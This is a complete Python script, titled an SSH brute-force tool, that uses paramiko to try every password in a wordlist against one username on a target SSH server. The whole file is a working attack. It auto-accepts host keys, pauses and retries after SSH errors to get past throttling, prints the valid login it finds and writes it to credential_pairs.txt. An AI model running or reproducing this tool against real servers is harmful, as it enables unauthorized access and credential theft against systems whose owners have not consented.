from paramiko import AuthenticationException, SSHClient, AutoAddPolicy, SSHException
import socket
import time
import argparse
from colorama import init, Fore

init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE


def ssh_checker(hostname, username, password, port):
    c = SSHClient()
    c.set_missing_host_key_policy(AutoAddPolicy())
    try:
        c.connect(
            hostname=hostname,
            username=username,
            password=password,
            port=port,
        )
    except socket.timeout:
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except SSHException:
        print(f"{BLUE}[*] Stand by for retry, wait one minute....{RESET}")
        time.sleep(60)
        return ssh_checker(hostname, username, password, port)
    else:
        print(
            f"{GREEN}[+] Found combination: \n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n"
            f"\tPASSWORD: {password}{RESET} "
        )
        return True


def main():
    parser = argparse.ArgumentParser(description="SSH Bruteforce script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server.")
    parser.add_argument(
        "-p", dest="port", help="SSH port number.(default port number 22)", default=22
    )

    parser.add_argument("-u", dest="user", help="Login username.")
    parser.add_argument(
        "-w",
        dest="passlist",
        help="Select the file that contains the password candidate.",
    )

    args = parser.parse_args()
    host_ip = args.host
    pass_list_file = args.passlist
    user_name = args.user
    port_num = args.port
    with open(pass_list_file) as rpass:
        pass_list = rpass.read().splitlines()

    for password in pass_list:
        if ssh_checker(host_ip, user_name, password, port_num):
            with open("credential_pairs.txt", "w") as w:
                w.write(f"{user_name}@{host_ip}: {password}")
                break


if __name__ == "__main__":
    main()
